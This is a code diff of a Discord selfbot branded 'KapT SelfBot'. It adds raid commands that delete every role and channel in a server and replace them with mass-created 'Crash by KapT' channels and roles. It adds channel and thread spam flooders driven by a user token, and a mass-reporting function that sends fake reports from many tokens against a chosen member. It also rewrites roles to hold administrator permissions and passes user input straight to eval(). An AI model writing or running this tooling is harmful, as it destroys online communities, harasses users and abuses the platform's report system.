+    open(f"{log_filename}.txt", "w", encoding = 'utf-8').write(log_text + '\n\n' + log_table.get_string())
+    await ctx.message.edit(content = f"The mass reporter has completed his work. {len(tokens_array)} tokens sent {current_report - 1} reports to {member.mention}.")
+    try: await ctx.send(file = discord.File(f"{log_filename}.txt"))
+    except: await ctx.send("Can't send log file.")
+
 
 @client.command()
 async def drole(ctx):
@@ -1103,15 +775,19 @@ async def roles(ctx):
     await ctx.message.delete()
     try:
         roles = [role for role in ctx.guild.roles[::-1]]
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.add_field(name="**Server Roles:**",
-                        value="\n".join([role.name for role in roles]))
-        await ctx.send(embed=embed)
     except:
         await ctx.send("""**__Server Roles:__**\n""" +
                        "\n".join([role.name for role in roles]))
 
+@client.command()
+async def fastauto(ctx):
+    for rolee in ctx.guild.roles:
+        create_task(killrole(ctx, role=rolee))
+    for channel in ctx.guild.channels:
+        create_task(killchannel(ctx, ch=channel))
+    for _ in range(50):
+        create_task(createchannel(ctx))
+        create_task(createrole(ctx))
 
 @client.command()
 async def auto(ctx):
@@ -1161,13 +837,17 @@ https://t.me/kapt_self_bot
 ''', username = "Crashed by SelfBot-Kapt")
             except: pass
 
+
 @client.command()
-async def spamv2(ctx, num=100, *, text='@everyone @here Raid by KapT-SelfBot'):
-	if num == 0 or text in ['']:
-		await ctx.send(f'')
-	else:
-		for spam in range(int(num)):
-			await ctx.send(f'{text}')
+async def spamall(ctx, kapt: int, *, lol):
+    for channel in ctx.guild.text_channels:
+        create_task(sendch(ctx, ch=channel, text=f'{lol}\n||{random.randint(1000, 9999)}||', count=kapt))
+
+@client.command(pass_contex=True)
+async def bypass_spam(ctx, lol: int, *, message):
+    await ctx.message.delete()
+    for _i in range(lol):
+        await ctx.send(f'{message} ||{random.randint(1000, 9999)}||')
 
 @client.command()
 async def dellall(ctx):
@@ -1189,7 +869,7 @@ async def dellall(ctx):
             pass
 
 @client.command()
-async def bypass(ctx):
+async def anticrash(ctx):
     for role in ctx.guild.roles:
         try:
             await role.edit(name="Crashed by KapT-SelfBot", permissions=discord.Permissions(permissions=8))
@@ -1227,7 +907,49 @@ async def spam(ctx, amount: int, *, message):
     for _i in range(amount):
         await ctx.send(message)
 
+
+
+@client.command()
+async def threadspam(ctx, maxamount: int = 10):
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+    threads = []
+    for i in range(maxamount):
+        thread = Thread(target=MassThread, args=(
+            ctx,
+            maxamount,
+        )).start()
+        threads.append(thread)
+
 # Personal
+
+@client.command()
+async def invite(ctx, *, link):
+    if "discord.gg/" in link:
+        link2 = (link.split("https://discord.gg/")[1])[:10]
+        response = requests.get(
+            f'https://discord.com/api/v6/invite/{link2}').json()
+        if 'Unknown Invite' in response:
+            await ctx.message.edit(
+                content="**Wrong invitation link!**",
+                delete_after=3)
+        else:
+            try:
+                embed = f"**Server Name: `{response['guild']['name']}`\nServer id: `{response['guild']['id']}`\nInvitation Maker Name: `{response['inviter']['username']}`\nInvitation Creator Tag: `{response['inviter']['discriminator']}`\nid of the creator of the invitation: `{response['inviter']['id']}`\nChannel Name: `{response['channel']['name']}`\nChannel id: `{response['channel']['id']}`**"
+            except:
+                await ctx.message.edit(
+                    content="**Wrong invitation link!**",
+                    delete_after=3)
+                return
+
+            await ctx.message.edit(content=embed)
+    else:
+        await ctx.message.edit(
+            content=
+            "**Please provide the invitation link in the format\n```<https://discord.gg/link>```**",
+            delete_after=5)
 
 @client.command()
 async def delguild(ctx):
@@ -1259,18 +981,7 @@ async def reactionall( ctx, amount: int):
 @client.command()
 async def guilds(ctx):
     await ctx.message.delete()
-    try:
-        guilds = [guild for guild in client.guilds]
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.add_field(name="**GuildCount:**",
-                        value=f"{len(client.guilds)}",
-                        inline=False)
-        embed.add_field(name="**Guild Names:**",
-                        value="\n".join([guild.name for guild in guilds]))
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(f"""**GuildCount:**
+    await ctx.send(f"""**GuildCount:**
 {len(client.guilds)}
 **Guild Names:**\n""" + "\n".join([guild.name for guild in guilds]))
 
@@ -1278,33 +989,13 @@ async def guilds(ctx):
 @client.command()
 async def prefix(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at,
-                              description=j["prefix"])
-        embed.set_author(name="PREFIX", icon_url=ctx.author.avatar_url)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(f"""**__PREFIX__**\n`""" + j["prefix"] + "`")
+    await ctx.send(f"""**__PREFIX__**\n`""" + j["prefix"] + "`")
 
 
 @client.command()
 async def myroles(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        roles = [role for role in ctx.author.roles]
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.add_field(name=f"**Roles:**",
-                        value=f"{len(ctx.author.roles)}",
-                        inline=False)
-        embed.add_field(name="**Role Names:**",
-                        value="\n".join([role.name for role in roles]))
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(f"""**Roles:**\n`{len(ctx.author.roles)}`
+    await ctx.send(f"""**Roles:**\n`{len(ctx.author.roles)}`
 **Role Names:**\n""" + "\n".join([role.name for role in roles]))
 
 
@@ -1322,7 +1013,7 @@ async def nickreset(ctx):
 @client.command(aliases=['friendexport'])
 async def friendbackup(ctx):
     friends = requests.get(
-        'https://canary.discordapp.com/api/v8/users/@me/relationships',
+        'https://discordapp.com/api/v8/users/@me/relationships',
         headers={
             'authorization': token,
             'user-agent': 'Mozilla/5.0'
@@ -1371,13 +1062,7 @@ async def subtract(ctx, number1, number2):
 async def multiply(ctx, number1, number2):
     x = f"{number1}*{number2}"
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(
-            color=discord.Colour.from_rgb(255, 0, 0),
-            description=f"Question: {number1} * {number2}\nAnswer: {eval(x)}")
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(
+    await ctx.send(
             f"""**Question:** {number1} * {number2}\n**Answer:** {eval(x)}""")
 
 
@@ -1385,25 +1070,14 @@ async def multiply(ctx, number1, number2):
 async def divide(ctx, number1, number2):
     x = f"{number1} / {number2}"
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(
-            color=discord.Colour.from_rgb(255, 0, 0),
-            description=f"Question: {number1} / {number2}\nAnswer: {eval(x)}")
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(
+    await ctx.send(
             f"""**Question:** {number1} / {number2}\n**Answer:** {eval(x)}""")
 
 
 @client.command()
 async def calculator(ctx, *, x):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              description=f"Question: {x}\nAnswer: {eval(x)}")
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(f"""**Question:** {x}\n**Answer:** {eval(x)}""")
+    await ctx.send(f"""**Question:** {x}\n**Answer:** {eval(x)}""")
 
 
 # Server
@@ -1412,23 +1086,13 @@ async def calculator(ctx, *, x):
 @client.command()
 async def servericon(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0))
-        embed.set_image(url=ctx.guild.icon_url)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(f"{ctx.guild.icon_url}")
+    await ctx.send(f"{ctx.guild.icon_url}")
 
 
 @client.command()
 async def serverbanner(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0))
-        embed.set_image(url=ctx.guild.banner_url)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(f"{ctx.guild.banner_url}")
+    await ctx.send(f"{ctx.guild.banner_url}")
 
 
 @client.command()
@@ -1440,14 +1104,7 @@ async def servername(ctx):
 @client.command()
 async def serverinfo(ctx):
     await ctx.message.delete()
-    try:
-        roles = [role for role in ctx.guild.roles[::-1]]
-        channels = [channel for channel in ctx.guild.channels[::-1]]
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        roles = [role for role in ctx.guild.roles[::-1]]
-    except:
-        await ctx.send(f"""**__SERVERINFO__**
+    await ctx.send(f"""**__SERVERINFO__**
         
 **Server Name:**
 `{ctx.guild.name}`
@@ -1472,31 +1129,14 @@ async def serverinfo(ctx):
 @client.command()
 async def serverroles(ctx):
     await ctx.message.delete()
-    try:
-        roles = [role for role in ctx.guild.roles[::-1]]
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.add_field(name="**Server Roles:**",
-                        value="\n".join([role.name for role in roles]))
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__Server Roles:__**\n""" +
+    await ctx.send("""**__Server Roles:__**\n""" +
                        "\n".join([role.name for role in roles]))
 
 
 @client.command()
 async def serverchannels(ctx):
     await ctx.message.delete()
-    try:
-        channels = [channel for channel in ctx.guild.channels]
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.add_field(name="**Server Channels:**",
-                        value="\n".join([channel.name
-                                         for channel in channels]))
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__Server Channels:__**\n""" +
+    await ctx.send("""**__Server Channels:__**\n""" +
                        "\n".join([channel.name for channel in channels]))
 
 
@@ -1522,117 +1162,17 @@ async def copy(ctx):
                 perms = role.permissions
                 await g.create_role(name=name, permissions=perms, colour=color)
 
-# Music ( BETA )
-
-#@client.command()
-#async def play(ctx, *, query):
-#    await ctx.message.delete()
-#    voice = get(Exeter.voice_clients, guild=ctx.guild)
-#    if voice and voice.is_connected():
-#        voice.play('song.mp3')
-#    else:
-#        await ctx.send('You need to be a in VC to play music')
-
-#@client.command()
-#async def stop(ctx):
-#    await ctx.message.delete()
-#    await ctx.send("Stopped the music player!")
-
-#@client.command()
-#async def skip(ctx):
-#    await ctx.message.delete()
-#    await ctx.send("Skipped song!")
-
-#@client.command()
-#async def lyrics(ctx, *, args):
-#    await ctx.message.delete()
-#    await ctx.send("Showing lyrics for " + args)
-
-# Nsfw
-
-
 @client.command()
-async def hentai(ctx):
+async def clonechannel(ctx):
     await ctx.message.delete()
-    try:
-        hentai = requests.get("https://nekos.life/api/v2/img/hentai")
-        res = hentai.json()
-    except:
-        await ctx.send(res["url"])
-
+    new = await ctx.channel.clone()
+    await new.edit(position=ctx.channel.position)
+    await ctx.channel.delete()
 
 @client.command()
-async def sex(ctx):
-    await ctx.message.delete()
-    try:
-        anal = requests.get("https://nekos.life/api/v2/img/anal")
-        res = anal.json()
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.set_author(name="𝙎𝙀𝙓", icon_url=ctx.author.avatar_url)
-        embed.set_image(url=res["url"])
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(res["url"])
-
-
-@client.command()
-async def tits(ctx):
-    await ctx.message.delete()
-    try:
-        boobs = requests.get("https://nekos.life/api/v2/img/boobs")
-        res = boobs.json()
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.set_author(name="𝙏𝙄𝙏𝙎", icon_url=ctx.author.avatar_url)
-        embed.set_image(url=res["url"])
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(res["url"])
-
-
-@client.command()
-async def pussy(ctx):
-    await ctx.message.delete()
-    try:
-        pussy = requests.get("https://nekos.life/api/v2/img/pussy")
-        res = pussy.json()
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.set_author(name="𝙋𝙐𝙎𝙎𝙔")
-        embed.set_image(url=res["url"])
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(res["url"])
-
-
-@client.command()
-async def dick(ctx):
-    await ctx.message.delete()
-    try:
-        dick = requests.get("https://nekos.life/api/v2/img/blowjob")
-        res = dick.json()
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.set_author(name="𝘿𝙄𝘾𝙆", icon_url=ctx.author.avatar_url)
-        embed.set_image(url=res["url"])
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(res["url"])
-
-
-@client.command()
-async def dmall(ctx, *, msg: str):
-    try:
-        members = ctx.channel.members
-        for member in members:
-            if member is not ctx.author:
-                try:
-                    await member.send(f"""Send by KapT SelfBot\n {msg}""")
-                except Exception:
-                    pass
-    except Exception:
-        pass
+async def leave(ctx):
+    await ctx.send('GG')
+    await ctx.guild.leave()
 
 
 @client.command()
@@ -1684,5 +1224,106 @@ async def deleteallfriends(ctx):
     except Exception:
         pass
 
+# SHIIIIIIIIIIIIIT
+
+def MassThread(ctx, maxamount):
+    while maxamount >= 0:
+        r = requests.post(
+            f"https://canary.discord.com/api/v9/channels/{ctx.channel.id}/threads",
+            json={
+                "name": f"Raid by KapT Self-Bot",
+                "type": 11,
+                "auto_archive_duration": 60,
+                "location": "Slash Command"
+            },
+            headers={"Authorization": f"{token}"})
+        if r.status_code != int(201):
+            print(f"{r.json()}")
+            if r.json()['retry_after'] >= 200:
+                print(f"more 200s.")
+                break
+        elif r.status_code == int(404):
+            print(f"Channel deleted")
+            break
+        elif r.status_code == int(429):
+            print(f"API BAN :(")
+            break
+        else:
+            print(f"Done")
+            maxamount - 1
+        continue
+
+start_time = datetime.datetime(2021,12,26,18,35,00)
+start_unix_time = datetime.datetime(1970,1,1,0,0,0)
+
+async def killchannel(ctx, ch):
+    try:
+        await ch.delete()
+    except:
+        pass
+
+
+async def killrole(ctx, role):
+    try:
+        await role.delete()
+    except:
+        pass
+
+
+async def createchannel(ctx):
+    try:
+        c = await ctx.guild.create_text_channel(
+            f'crash-by-KapT Self-Bot-{random.randint(1, 1000)}')
+    except:
+        pass
+    else:
+        pass
+
+
+async def createrole(ctx):
+    try:
+        await ctx.guild.create_role(
+            name=f'Crash by KapT Self-Bot {random.randint(1, 1000)}', color=0xff0000)
+    except:
+        pass
+
+def send_report(token: str, guild_id: int, channel_id: int, message_id: int):
+    reason = random.choice([0, 1, 2, 3, 4])
+    Responses = {
+        '401: Unauthorized': f'Invalid Discord token.',
+        'Missing Access': f'Missing access to channel or guild.',
+        'You need to verify your account in order to perform this action.': f'Unverified.'
+    }
+
+    json={
+        'channel_id': channel_id,
+        'message_id': message_id,
+        'guild_id': guild_id,
+        'reason': reason,
+    }
+    headers={
+        'Accept': '*/*',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'sv-SE',
+        'User-Agent': 'Discord/21295 CFNetwork/1128.0.1 Darwin/19.6.0',
+        'Content-Type': 'application/json',
+        'Authorization': token
+    }
+
+    report = rq.post('https://discordapp.com/api/v9/report', json=json, headers=headers)
+    
+    if (status := report.status_code) == 201:
+        return (True, reason)
+    elif status in (401, 403):
+        return (False, reason)
+    else:
+        return (report.status_code, reason)
+
+async def sendch(ctx, ch, text, count):
+    for _ in range(count):
+        try:
+            await ch.send(text)
+        except:
+            pass
 
 client.run(token, bot=False)
